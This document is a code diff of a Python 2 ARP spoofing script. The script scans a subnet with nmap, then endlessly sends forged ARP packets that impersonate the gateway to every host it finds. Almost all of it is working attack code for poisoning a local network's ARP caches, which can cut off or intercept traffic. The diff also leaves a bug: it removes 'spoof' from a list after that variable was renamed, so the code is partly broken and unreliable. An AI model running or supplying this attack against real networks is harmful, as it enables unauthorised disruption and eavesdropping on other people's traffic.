@@ -7,10 +7,9 @@ import nmap
 
 
 def get_all_host_in_local_network(ipprefix, mask_len):
-    nm = nmap.PortScanner()
     hosts = ipprefix + '/' + mask_len
+    nm = nmap.PortScanner()
     nm.scan(hosts=hosts, arguments='-p 161 -sU ')
-
     hosts_list = [x for x in nm.all_hosts()]
     return hosts_list
 
@@ -34,33 +33,18 @@ def ip_to_int(ip):
     return socket.ntohl(struct.unpack("I", socket.inet_aton(str(ip)))[0])
 
 
-def genetate_host_ip(int_ip, mask_len):
-    _len = 32 - int(mask_len)
-    host_list = []
-
-    for i in xrange(2**_len):
-        host_list.append(int_to_ip(int_ip + i))
-
-    return host_list
-
-
 def ARPAttack(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
+    # [Important!]skip the gateway and host itself.
+    gateway = int_to_ip(ip_to_int(ipprefix)+1)
+    victim_list = get_all_host_in_local_network(ipprefix, mask_len)
+    victim_list.remove(get_my_ip())
+    victim_list.remove(spoof)
+
     request = 1
-    int_ip = ip_to_int(ipprefix)
-    spoof = int_to_ip(int_ip+1)
-    victim_list = get_all_host_in_local_network(ipprefix, mask_len)[1:]
-    print victim_list
-    host_ip = get_my_ip()
     while True:
         for victim in victim_list:
-            if victim == host_ip:
-                continue
-            arp = ARP(op=request, psrc=spoof, pdst=victim, hwsrc=mac)
+            arp = ARP(op=request, psrc=gateway, pdst=victim, hwsrc=mac)
             send(arp)
-            print "victim: ", victim
-            # time.sleep(0.001)
 
 if __name__ == "__main__":
-    ipprefix = sys.argv[1]
-    mask_len = sys.argv[2]
-    ARPAttack(ipprefix, mask_len)
+    ARPAttack(sys.argv[1], sys.argv[2])
